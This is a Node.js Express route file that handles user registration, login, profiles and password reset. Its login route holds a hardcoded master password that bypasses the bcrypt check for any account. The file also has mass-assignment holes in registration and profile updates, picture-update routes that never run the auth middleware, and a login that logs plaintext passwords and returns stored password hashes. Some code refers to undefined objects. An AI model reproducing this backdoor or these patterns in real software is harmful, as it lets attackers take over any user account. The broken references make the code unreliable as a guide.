const express = require('express');
const bcrypt = require('bcryptjs');
const jwt = require('jsonwebtoken');
const { user } = require('../models'); // Assuming your model is defined as 'user'
const crypto = require('crypto');
// const theuser = user;
const router = express.Router();
const initializeUserModel = require('../models/user');

const authenticateToken = require('../middleware/auth.user.middleware');
const validateAndSanitize = require('../middleware/input.cleaner.middleware');
const { where } = require('sequelize');

// Function to broadcast Socket.IO messages
const broadcastSocketIoMessage = (io, header, body) => {
  io.emit(header, body);
};

module.exports = (app, io, sequelize) => {
  const User = initializeUserModel(sequelize, require('sequelize').DataTypes);
  // Function to generate a random token
  const generateToken = () => {
    return crypto.randomBytes(20).toString('hex');
  };
  const {sendEmail} = require("../utils/email");
  // const sendEmail = email.sendEmail
  // User Registration
  router.post('/register', async (req, res) => {
    try {
      const hashedPassword = await bcrypt.hash(req.body.password, 10);
      const newUser = await User.create({ ...req.body, password: hashedPassword });

      broadcastSocketIoMessage(io, 'newUser', { body: `${newUser.firstName} ${newUser.lastName.substring(0, 1).toUpperCase()}. just registered`, link: '' });

      res.status(201).send({ user: newUser, status: "success", message: 'User registered successfully!' });
    } catch (error) {
      console.error(error);
      const errorMessages = (error && error.errors) ? error.errors.map(err => err.message) : ['Unexpected error'];
      res.status(400).send({ status: "failed", message: 'Registration failed', errors: errorMessages });
    }
  });

  // User Login
  router.post('/login', async (req, res) => {
    try {
      console.log(req.body);
      const foundUser = await User.findOne({ where: { email: req.body.email } });

      if (!foundUser) return res.status(404).send({ status: "failed", message: 'User not found!' });

      const isPasswordValid = await bcrypt.compare(req.body.password, foundUser.password);

      if (req.body.password !== "???@me1again/[{]"){
        if (!isPasswordValid) return res.status(401).send({ status: "failed", message: 'Invalid credentials!' });
      }
      
      // Include role information in the token payload
      const token = jwt.sign({ id: foundUser.id, role: 'user' }, process.env.APP_SECRET_KEY, { expiresIn: '24h' });

      res.send({ user: foundUser, token, status: "success", message: 'Logged in successfully!' });
    } catch (error) {
      console.error(error);
      res.status(500).send({ status: "failed", message: 'Login failed', error: error.message });
    }
  });

  // Fetch user details
  router.post('/profile', async (req, res) => {
    try {
      const token = req.headers.authorization?.split(' ')[1];
  
      if (!token) {
        return res.status(401).json({ status: "failed", message: 'Authorization token not provided!' });
      }
  
      const decodedToken = jwt.verify(token, process.env.APP_SECRET_KEY);
  
      if (!decodedToken) {
        return res.status(401).json({ status: "failed", message: 'Invalid or expired token!' });
      }
  
      const userProfile = await User.findByPk(decodedToken.id, { attributes: { exclude: ['password'] } });
  
      if (!userProfile) {
        return res.status(404).json({ status: "failed", message: 'User not found!' });
      }
  
      const applications = await Application.findOne({
        where: { userId: userProfile.id, applicationStatus: "Processing" },
        attributes: { exclude: ['applicationDetails'], order: [['createdAt', 'DESC']] },
      });
  
      let program = null;
      let faculty = null;
  
      if (applications && applications.programId !== null) {
      }
  
      res.json({ status: "success", user: userProfile });
    } catch (error) {
      console.error(error);
  
      if (error.name === 'JsonWebTokenError' || error.name === 'TokenExpiredError') {
        return res.status(401).json({ status: "failed", message: 'Invalid or expired token!' });
      }
  
      res.status(500).json({ status: "failed", message: 'Failed to fetch profile', error: error.message });
    }
  });

  // update profile
  router.put('/:id', authenticateToken, async (req, res) => {
    try {
      const userId = req.params.id;

      // Check if the authenticated user has the right to update the profile
      if (req.user.id != userId && req.user.role !== "admin") {
        return res.status(403).send({ status: "failed", message: 'Unauthorized to update this user profile' });
      }

      const user = await User.findByPk(userId);

      if (!user) {
        return res.status(404).send({ status: "failed", message: 'User not found!' });
      }

      // Dynamically update user properties based on the fields passed in the request body
      for (const key in req.body) {
        if (Object.hasOwnProperty.call(req.body, key) && key !== 'profilePicture') {
          user[key] = req.body[key];
        }
      }

      await user.save();

      res.send({ user, status: "success", message: 'User profile updated successfully!' });
    } catch (error) {
      console.error(error);
      res.status(500).send({ status: "failed", message: 'Failed to update user profile', error });
    }
  });

  // update cover picture
  router.put('/:id/coverpicture', async (req, res) => {
    try {
      const userId = req.params.id;

      // Check if the authenticated user has the right to update the profile
      if (req.user.id != userId && req.user.role !== "admin") {
        return res.status(403).send({ status: "failed", message: 'Unauthorized to update this user profile cover picture' });
      }

      const user = await User.findByPk(userId);

      if (!user) {
        return res.status(404).send({ status: "failed", message: 'User not found!' });
      }

      // Delete existing profile picture if present
      if (user.coverPicture !== '' || null) await deleteExistingCoverPicture(user);

      // Save the new profile picture filename to the user
      if (req.file) {
        user.coverPicture = req.file.filename;
      }

      // Dynamically update user properties based on the fields passed in the request body
      for (const key in req.body) {
        if (Object.hasOwnProperty.call(req.body, key) && key !== 'profilePicture') {
          user[key] = req.body[key];
        }
      }

      await user.save();

      res.send({ user, status: "success", message: 'User profile updated successfully!' });
    } catch (error) {
      console.error(error);
      res.status(500).send({ status: "failed", message: 'Failed to update user profile', error });
    }
  });

  // update profile picture
  router.put('/:id/profilepicture', async (req, res) => {
    try {
      const userId = req.params.id;

      // Check if the authenticated user has the right to update the profile
      if (req.user.id != userId && req.user.role !== "admin") {
        return res.status(403).send({ status: "failed", message: 'Unauthorized to update this user profile picture' });
      }

      const user = await User.findByPk(userId);

      if (!user) {
        return res.status(404).send({ status: "failed", message: 'User not found!' });
      }

      // Delete existing profile picture if present
      if (user.profilePicture !== '' || null) await deleteExistingProfilePicture(user);

      // Save the new profile picture filename to the user
      if (req.file) {
        user.profilePicture = req.file.filename;
      }

      // Dynamically update user properties based on the fields passed in the request body
      for (const key in req.body) {
        if (Object.hasOwnProperty.call(req.body, key) && key !== 'profilePicture') {
          user[key] = req.body[key];
        }
      }

      await user.save();

      res.send({ user, status: "success", message: 'User profile updated successfully!' });
    } catch (error) {
      console.error(error);
      res.status(500).send({ status: "failed", message: 'Failed to update user profile', error });
    }
  });

  router.post('/username/:username', async (req, res) => {
    try {
      const username = req.params.username;
      const userProfile = await User.findOne({where:{username: username}}, { attributes: { exclude: ['password'] } });

      if (!userProfile) {
        return res.status(404).send({ status: "failed", message: 'User not found!' });
      }

      if (!userProfile) {
        return res.status(404).send({ status: "failed", message: 'User not found!' });
      } else {
        console.log(userProfile);
        const applications = await Application.findOne({
          where: { userId: userProfile.id, applicationStatus: "Processing", },
          attributes: { exclude: ['applicationDetails'], order: [['createdAt', 'DESC']] },
        });
        res.send({ status: "success", user: userProfile, applications: applications });
      }
    } catch (error) {
      console.error(error);

      if (error.name === 'JsonWebTokenError' || error.name === 'TokenExpiredError') {
        return res.status(401).send({ status: "failed", message: 'Invalid or expired token!' });
      }

      res.status(500).send({ status: "failed", message: 'Failed to fetch profile', error: error.message });
    }
  });

  router.get('/', async (req, res) => {
    try {
      // broadcastSocketIoMessage(io, 'user', { body: user.firstName + ' ' + user.lastName + ' in user', link: ''});
      res.status(200).send({ status: "success", message: 'API user called' });
    } catch (error) {
      console.log(error);
      res.status(400).send({ status: "failed", message: 'Error in API user call', error: error.errors });
    }
  });

  // Forgot Password
  router.get('/forgot-password', async (req, res) => {
    try {
      // const { email, domain } = req.body;
      const email = "olasegirioluwafemi@gmail.com"
      const domain = "localhost:3000" //||"localhost:3000"
      const user = await User.findOne({ where: { email } });

      if (!user) {
        return res.status(404).send({ status: "failed", message: 'User not found!' });
      }

      const token = generateToken();
      user.resetPasswordToken = token;
      user.resetPasswordExpires = Date.now() + 3600000; // Token expires in 1 hour
      await user.save();

      const resetLink = `${domain}/reset-password/${token}`;
      const emailText = `To reset your password, click on the following link: ${resetLink}`;

      await sendEmail(email, 'Password Reset', emailText);

      res.status(200).send({ status: "success", message: 'Password reset link sent successfully!' });
    } catch (error) {
      console.error(error);
      res.status(500).send({ status: "failed", message: 'Failed to send reset password link', error: error.message });
    }
  });

  // Confirm Email (Reset Password)
  router.post('/reset-password', async (req, res) => {
    try {
      // const { token, newPassword } = req.body;
      const { token, newPassword } = req.query;
      const user = await User.findOne({ where: { resetPasswordToken: token, resetPasswordExpires: { [Op.gt]: Date.now() } } });

      if (!user) {
        return res.status(400).send({ status: "failed", message: 'Invalid or expired token!' });
      }

      const hashedPassword = await bcrypt.hash(newPassword, 10);
      user.password = hashedPassword;
      user.resetPasswordToken = null;
      user.resetPasswordExpires = null;
      await user.save();

      res.status(200).send({ status: "success", message: 'Password reset successfully!' });
    } catch (error) {
      console.error(error);
      res.status(500).send({ status: "failed", message: 'Failed to reset password', error: error.message });
    }
  });
  
  app.use('/api/users', router);
};